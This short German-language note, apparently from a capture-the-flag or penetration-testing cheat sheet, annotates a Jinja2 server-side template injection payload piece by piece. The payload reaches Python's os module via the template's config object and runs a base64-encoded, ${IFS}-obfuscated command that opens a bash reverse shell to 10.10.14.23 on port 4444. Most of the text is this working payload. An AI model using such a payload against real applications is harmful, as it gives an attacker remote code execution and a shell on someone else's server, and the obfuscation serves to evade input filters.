```
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjE=${IFS}|base64${IFS}-d|bash').read()}}
```

nutzt pythons os modul  
`{{config.__class__.__init__.__globals__['os']`

aus python heraus einen shell befehl ausführen  
`popen`

shell befehl in base64  
`('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjE=${IFS}`
{IFS} dient nur der verschleierung

dekodierung vor der ausführung  
`|base64${IFS}-d`
